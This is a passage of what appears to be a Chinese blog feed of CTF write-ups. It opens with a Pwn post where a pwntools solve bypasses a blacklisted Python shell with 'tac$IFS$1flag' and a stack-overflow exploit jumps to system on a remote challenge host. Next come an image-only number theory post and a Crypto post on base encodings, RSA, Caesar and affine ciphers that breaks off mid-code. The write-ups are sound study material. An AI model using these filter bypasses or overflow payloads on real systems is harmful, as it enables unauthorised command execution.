$1</code>将只打印出一个空行</p></blockquote><p>所以可以准确得出这里的$1可以将字符串进行截断，然后使用$IFS告诉终端这是一个环境变量代表的是空格，从而进行输出。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line">art = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">   ((  &quot;####@@!!$$    ))</span></span><br><span class="line"><span class="string">       `#####@@!$$`  ))</span></span><br><span class="line"><span class="string">    ((  &#x27;####@!!$:</span></span><br><span class="line"><span class="string">   ((  ,####@!!$:   ))</span></span><br><span class="line"><span class="string">       .###@!!$:</span></span><br><span class="line"><span class="string">       `##@@!$:</span></span><br><span class="line"><span class="string">        `#@!!$</span></span><br><span class="line"><span class="string">  !@#    `#@!$:       @#$</span></span><br><span class="line"><span class="string">   #$     `#@!$:       !@!</span></span><br><span class="line"><span class="string">            &#x27;@!$:</span></span><br><span class="line"><span class="string">        &#x27;`\   &quot;!$: /`&#x27;</span></span><br><span class="line"><span class="string">           &#x27;\  &#x27;!: /&#x27;</span></span><br><span class="line"><span class="string">             &quot;\ : /&quot;</span></span><br><span class="line"><span class="string">  -.&quot;-/\\\-.&quot;//.-&quot;/:`\.&quot;-.JrS&quot;.&quot;-=_\\</span></span><br><span class="line"><span class="string">&quot; -.&quot;-.\\&quot;-.&quot;//.-&quot;.`-.&quot;_\\-.&quot;.-\&quot;.-//&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(art)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;My_shell_ProVersion&quot;</span>)</span><br><span class="line"></span><br><span class="line">blacklist = [<span class="string">&#x27;cat&#x27;</span>,<span class="string">&#x27;ls&#x27;</span>,<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;cd&#x27;</span>,<span class="string">&#x27;echo&#x27;</span>,<span class="string">&#x27;&lt;&#x27;</span>,<span class="string">&#x27;$&#123;IFS&#125;&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    command = <span class="built_in">input</span>()</span><br><span class="line">    <span class="built_in">print</span>(command)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> command:</span><br><span class="line">            <span class="built_in">print</span>(command)</span><br><span class="line">            exit(<span class="number">0</span>)</span><br><span class="line">    os.system(command)</span><br><span class="line">    </span><br><span class="line">===================================================================================================================</span><br><span class="line">slove.py</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28994</span>)</span><br><span class="line">p.sendline(<span class="string">&#x27;tac$IFS$1flag&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）"><a href="#SWPUCTF-2021-新生赛-gift-pwn（栈溢出查看偏移）" class="headerlink" title="[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）"></a>[SWPUCTF 2021 新生赛]gift_pwn（栈溢出查看偏移）</h2><ol><li>直接用ida查看0x10 + 8</li></ol><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121502497.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121502497.png"  class="" lazyload></a><ol start="2"><li><p>gdb覆盖查看，从rsp到rbp</p><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-20230725121544874.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-20230725121544874.png"  class="" lazyload></a></li><li><p>cyclic 偏移查看： 一般cyclic -l 错误的偏移地址</p><p>这道题根据偏移直接送结果就可以了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&#x27;./attach&#x27;</span></span><br><span class="line">elf = ELF(BINARY)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">debug = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process(BINARY)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node2.anna.nssctf.cn&#x27;</span>,<span class="number">28217</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>(<span class="params">s=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        gdb.attach(p, s)</span><br><span class="line">        pause()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">lg</span>(<span class="params">x, y</span>): <span class="keyword">return</span> log.success(<span class="string">f&#x27;<span class="subst">&#123;x&#125;</span>: <span class="subst">&#123;<span class="built_in">hex</span>(y)&#125;</span>&#x27;</span>)</span><br><span class="line">system = <span class="number">0x400480</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x10</span>+<span class="number">8</span>) + p64(system)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></li></ol><h3 id="gdb查看内存命令"><a href="#gdb查看内存命令" class="headerlink" title="gdb查看内存命令"></a>gdb查看内存命令</h3><blockquote><p>&#x2F;s                 查看相应地址的字符串<br>x&#x2F;i        查看汇编指令<br>x&#x2F;gx 查看相应地址的二进制信息<br>x&#x2F;wx按照字节形式显示二进制信息</p></blockquote><a class="simple-lightbox" href="/2023/07/24/Pwn_CTF/image-1676879380338.png"><img   src="/images/loading.svg" data-src="/2023/07/24/Pwn_CTF/image-1676879380338.png"  class="" lazyload></a>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;CTFSHOW&quot;&gt;&lt;a href=&quot;#CTFSHOW&quot; class=&quot;headerlink&quot; title=&quot;CTFSHOW&quot;&gt;&lt;/a&gt;CTFSHOW&lt;/h1&gt;&lt;h2 id=&quot;pwn37-38-return-text&quot;&gt;&lt;a href=&quot;#pwn37-38-retu</summary>
      
    
    
    
    <category term="Pwn" scheme="https://kidder1.github.io/categories/Pwn/"/>
    
    
    <category term="Pwn" scheme="https://kidder1.github.io/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>数论和抽象代数基础</title>
    <link href="https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/"/>
    <id>https://kidder1.github.io/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/</id>
    <published>2023-07-23T07:30:09.000Z</published>
    <updated>2023-08-02T08:36:40.112Z</updated>
    
    <content type="html"><![CDATA[<h1 id="素数-欧几里得定理-算术基本定理"><a href="#素数-欧几里得定理-算术基本定理" class="headerlink" title="素数  欧几里得定理  算术基本定理"></a>素数  欧几里得定理  算术基本定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154128841.png"  class="" lazyload></a><h2 id=""><a href="#" class="headerlink" title=""></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154730486.png"  class="" lazyload></a></h2><h1 id="模运算"><a href="#模运算" class="headerlink" title="模运算"></a>模运算</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723154926042.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155116655.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723155142800.png"  class="" lazyload></a><h1 id="欧几里得算法：辗转相除法"><a href="#欧几里得算法：辗转相除法" class="headerlink" title="欧几里得算法：辗转相除法"></a>欧几里得算法：辗转相除法</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201741963.png"  class="" lazyload></a><p>将大的数字的最大公因数可以转换成小的数字进行计算</p><p><strong><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723201915279.png"  class="" lazyload></a></strong></p><h1 id="乘法逆元"><a href="#乘法逆元" class="headerlink" title="乘法逆元"></a>乘法逆元</h1><p>​<a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723205038469.png"  class="" lazyload></a></p> <a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723210310770.png"  class="" lazyload></a><h1 id="中国剩余定理"><a href="#中国剩余定理" class="headerlink" title="中国剩余定理"></a>中国剩余定理</h1><a class="simple-lightbox" href="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"><img   src="/images/loading.svg" data-src="/2023/07/23/%E6%95%B0%E8%AE%BA%E5%92%8C%E6%8A%BD%E8%B1%A1%E4%BB%A3%E6%95%B0%E5%9F%BA%E7%A1%80/image-20230723212100571.png"  class="" lazyload></a>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;素数-欧几里得定理-算术基本定理&quot;&gt;&lt;a href=&quot;#素数-欧几里得定理-算术基本定理&quot; class=&quot;headerlink&quot; title=&quot;素数  欧几里得定理  算术基本定理&quot;&gt;&lt;/a&gt;素数  欧几里得定理  算术基本定理&lt;/h1&gt;&lt;a class=&quot;sim</summary>
      
    
    
    
    <category term="Math" scheme="https://kidder1.github.io/categories/Math/"/>
    
    
    <category term="Math" scheme="https://kidder1.github.io/tags/Math/"/>
    
  </entry>
  
  <entry>
    <title>Crypto_CTF</title>
    <link href="https://kidder1.github.io/2023/07/20/Crypto_CTF/"/>
    <id>https://kidder1.github.io/2023/07/20/Crypto_CTF/</id>
    <published>2023-07-20T14:00:37.000Z</published>
    <updated>2023-08-06T15:51:14.598Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="HNCTF"><a href="#HNCTF" class="headerlink" title="HNCTF"></a>HNCTF</h1><h2 id="baBAbaseSEse（base家族）"><a href="#baBAbaseSEse（base家族）" class="headerlink" title="baBAbaseSEse（base家族）"></a>baBAbaseSEse（base家族）</h2><p>base家族 </p><ul><li><p>随波逐流梭哈</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230720220320082.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230720220320082.png"  class="" lazyload></a></li><li><p>basecrack一把梭，windows我装不上，然后我就装到ubuntu了</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230720224021152.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230720224021152.png"  class="" lazyload></a></li></ul><h2 id="babyRsa（基本RSA）"><a href="#babyRsa（基本RSA）" class="headerlink" title="babyRsa（基本RSA）"></a>babyRsa（基本RSA）</h2><p>基础知识</p><blockquote><p>注意：这里不能安装其他库，不然会因为版本问产生一系列的兼容性问题</p></blockquote><ol><li>PyCryptodome库主要由以下模块组成：</li></ol><ul><li><code>Crypto.Cipher</code>：包含对称加密算法，如AES、DES等。</li><li><code>Crypto.PublicKey</code>：包含非对称加密算法，如RSA、DSA等。</li><li><code>Crypto.Hash</code>：包含哈希函数，如SHA256、MD5等。</li><li><code>Crypto.Signature</code>：包含数字签名相关功能。</li><li><code>Crypto.Random</code>：提供随机数生成器。</li><li><code>Crypto.Protocol</code>：包含各种协议实现，如PBKDF2。</li><li><code>Crypto.Util</code>：包含一些实用工具，如填充、字节处理等</li></ul><ol start="2"><li><p>对于RSA的一些工具</p><ul><li><p><strong>YAFU</strong>： YAFU（Yet Another Factoring Utility）是一个开源的用于整数因数分解的命令行工具。它是一个强大而灵活的工具，能够分解大整数为其质因数，有助于解决数论和密码学领域中的问题。YAFU是基于GMP（GNU多精度算法库）的，并使用了多种因数分解算法来优化分解过程。它是数学爱好者、密码学研究人员和密码分析者常用的工具之一</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.使用 cmd 进入到 yafu 所在目录下，或将目录加入到系统环境 PATH 变量，或打开目录文件夹后 shift+右键 选择在此处打开 powershell </span><br><span class="line">2.假如要分解因数 6 ，输入命令：.\yafu-x64.exe &quot;factor(6)&quot;</span><br><span class="line">3.如果因数过长，将 因数 用文本文件存放在 yafu 目录下，例如：data.txt 。文件最后一行一定要换行，否则eof; done processing batchfile。 运行命令：.\yafu-x64.exe &quot;factor(@)&quot; -batchfile data.txt</span><br></pre></td></tr></table></figure></li><li><p><strong>FactorDB</strong>： FactorDB是一个在线的整数因数分解数据库。它允许用户将大整数提交到数据库，并查找其质因数分解。这个数据库是由全球用户提交的整数分解结果共同维护的，它采用了多种现代算法来分解整数。FactorDB 对于那些没有自己的因数分解工具或想要验证分解结果的用户来说是非常有用的。通过FactorDB，用户可以快速地找到一个整数的质因数，而无需自行进行因数分解运算 网站<a href="http://www.factordb.com/">factordb.com</a></p></li></ul><p>这个题是一个简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime</span><br><span class="line"><span class="comment"># 这里我们导入了bytes_to_long函数，它用于将字节转换为长整数（将flag转换为m），以及导入了getPrime函数，它用于生成指定位数的随机素数。</span></span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">P39 = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">P39 = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = getPrime(<span class="number">128</span>)</span><br><span class="line">p = getPrime(<span class="number">128</span>)</span><br><span class="line"><span class="comment"># 这两行代码使用getPrime(128)函数生成两个128位的随机素数，并将它们赋值给变量p和q。在RSA加密中，p 和 q 是用于计算 RSA 公钥和私钥的重要参数。</span></span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line"><span class="comment"># n 是RSA的模数，它是两个素数 p 和 q 的乘积。</span></span><br><span class="line"><span class="comment"># e 是RSA的公钥指数，通常为固定值 65537（也称为常用的 RSA 公钥指数）。</span></span><br><span class="line"><span class="comment"># c 是RSA的密文，通过用公钥指数 e 对明文 m 进行模幂运算得到。</span></span><br><span class="line"><span class="built_in">print</span>(n,c)</span><br><span class="line"><span class="comment"># 62193160459999883112594854240161159254035770172137079047232757011759606702281</span></span><br><span class="line"><span class="comment"># 17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br></pre></td></tr></table></figure><p>通过上述工具进行分解之后，然后写出对应的解密脚本即可，这里主要是了解了这些库的一些基本使用而已</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">计算 RSA 私钥参数：</span><br><span class="line">使用已知的 p 和 q 计算了模数 n，并通过调用 invert(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>)) 函数计算得到私钥指数 d。</span><br><span class="line">RSA 解密并输出明文：</span><br><span class="line">使用得到的私钥指数 d 和模数 n，将密文 c 进行 RSA 解密，并通过 long_to_bytes 函数将解密后的长整数转换为明文，并进行输出。</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> bytes_to_long, getPrime, long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">234560843346150602519484260867514743467</span></span><br><span class="line">q = <span class="number">265147241000574873803071047177766359643</span></span><br><span class="line">c = <span class="number">17331436837911040930486942133359735652484926528331507431552667656734821231501</span></span><br><span class="line">n = p * q</span><br><span class="line">d = invert(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br></pre></td></tr></table></figure><p>然后安装了sage的软件，还没有使用，明天再看看吧！</p></li></ol><h2 id="A-dictator（凯撒密码）"><a href="#A-dictator（凯撒密码）" class="headerlink" title="A dictator（凯撒密码）"></a>A dictator（凯撒密码）</h2><p>凯撒密码就是根据偏移移位的密码</p><p>加密过程</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"><span class="comment"># # 用于生成一个在范围 [1, 100] 内的随机整数，并将其对 26 取模，以确保得到的偏移量在 0 到 25 之间</span></span><br><span class="line">offset = randint(<span class="number">1</span>,<span class="number">100</span>) % <span class="number">26</span></span><br><span class="line"><span class="built_in">print</span>(offset)</span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> flag.startswith(<span class="string">&#x27;NSSCTF&#123;&#x27;</span>)</span><br><span class="line"><span class="comment"># 确保flag字符串中除去前7个字符和最后一个字符的部分，所有字符都不是大写字母</span></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">all</span>([<span class="built_in">ord</span>(c) <span class="keyword">not</span> <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(<span class="string">&#x27;A&#x27;</span>),<span class="built_in">ord</span>(<span class="string">&#x27;Z&#x27;</span>)) <span class="keyword">for</span> c <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> char <span class="keyword">in</span> flag[<span class="number">7</span>:-<span class="number">1</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(char) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">        <span class="comment"># 小写字母计算偏移量</span></span><br><span class="line">        index = <span class="built_in">ord</span>(char)-<span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">        <span class="comment"># 计算新的字符</span></span><br><span class="line">        new_char = <span class="built_in">chr</span>((index+offset)%<span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">        <span class="built_in">print</span>(new_char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(char,end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment"># 密文</span></span><br><span class="line"><span class="comment"># cipher = &#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br></pre></td></tr></table></figure><p>解密过程：这个加密解密完都是小写字母，通过25个随机数字进行爆破解密即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cipher = <span class="string">&#x27;nby_wuymul_wcjbyl_cm_ihy_iz_nby_gimn_vumcw_wfummcwuf_wcjbylm&#x27;</span></span><br><span class="line"><span class="comment"># 从0-25遍历</span></span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">    <span class="built_in">print</span>()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>) &lt;= <span class="built_in">ord</span>(i) &lt;= <span class="built_in">ord</span>(<span class="string">&#x27;z&#x27;</span>):</span><br><span class="line">            index = <span class="built_in">ord</span>(i) - <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            new_char = <span class="built_in">chr</span>((index + offset) % <span class="number">26</span> + <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>))</span><br><span class="line">            <span class="built_in">print</span>(new_char, end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure><p>官方wp有一个string的库，这里学习了一下</p><blockquote><p><strong>问：from string import ascii_lowercase  string库是什么库？</strong></p><p><strong>答：在Python中，<code>string</code> 是一个标准库，它包含了许多与字符串处理相关的常用常量和函数。通过导入 <code>string</code> 库，你可以使用其中定义的常量和函数，而不需要自己定义相同的内容。</strong></p><p><strong>在给定的代码中，使用 <code>from string import ascii_lowercase</code> 导入了 <code>string</code> 标准库中的 <code>ascii_lowercase</code> 常量。<code>ascii_lowercase</code> 是一个包含所有小写字母的字符串，它的值为 <code>&#39;abcdefghijklmnopqrstuvwxyz&#39;</code>。这样一来，代码就可以直接使用 <code>ascii_lowercase</code> 变量来表示小写字母表，而不需要手动定义这个字符串。</strong></p></blockquote><h2 id="爱妃（仿射密码）"><a href="#爱妃（仿射密码）" class="headerlink" title="爱妃（仿射密码）"></a>爱妃（仿射密码）</h2><p>放射密码（Affine Cipher）是一种古典密码学中的替换密码，它对字母表中的字符进行加密和解密。放射密码的数学原理涉及到仿射函数的应用。</p><p>放射函数的一般形式为：E(x) &#x3D; (ax + b) mod m</p><p>其中：</p><ul><li>E(x) 表示密文字符；</li><li>x 表示明文字符；</li><li>a 和 b 是整数，并且满足 a 和 m 互质（最大公约数为1）；</li><li>mod m 表示对 m 取模，即结果在 0 到 (m-1) 的范围内。</li></ul><p>在放射密码中，每个明文字符 x 被映射为一个密文字符 E(x)。参数 a 和 b 是放射函数的密钥，通过正确选择这些密钥，可以实现有效的加密和解密。</p><p>解密过程是对密文字符应用逆放射函数：D(y) &#x3D; a^(-1) * (y - b) mod m，其中 a^(-1) 表示 a 的乘法逆元素。</p><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230722180423532.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230722180423532.png"  class="" lazyload></a><a class="simple-lightbox" href="/2023/07/20/Crypto_CTF/image-20230722181454094.png"><img   src="/images/loading.svg" data-src="/2023/07/20/Crypto_CTF/image-20230722181454094.png"  class="" lazyload></a><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 